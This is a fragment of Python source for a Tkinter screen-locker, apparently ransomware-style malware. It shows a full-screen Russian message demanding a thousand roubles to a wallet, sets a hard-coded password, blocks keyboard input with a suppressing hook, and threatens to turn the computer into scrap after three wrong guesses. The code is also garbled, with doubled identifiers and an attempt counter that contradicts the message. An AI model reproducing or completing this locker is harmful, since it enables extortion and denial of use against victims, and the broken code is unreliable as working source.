...
password = "228"
lock_text = "Привет дружок пирожок. Твой компьютер немного спит. Чтобы разбудить его нужен пароль. Есть два варианта: либо ты мне скидываешь сюда тясчу рубликов: кошелёк. Либо же ты пытаешься угадать пароль (он легкий всего 3 циферки), но учти попыток у тебя всего 3. Просрешь их всех - компьютер превратиться в кусок металлалома. Удачи!"
count  =  5
...
untexLabel = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
untexuntex.pack(side=TOP)

keyboardkeyboard.on_press(tapp, suppress=True)
...
button5button5 = Button(wind,text='5',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "5")).pack(side=LEFT)
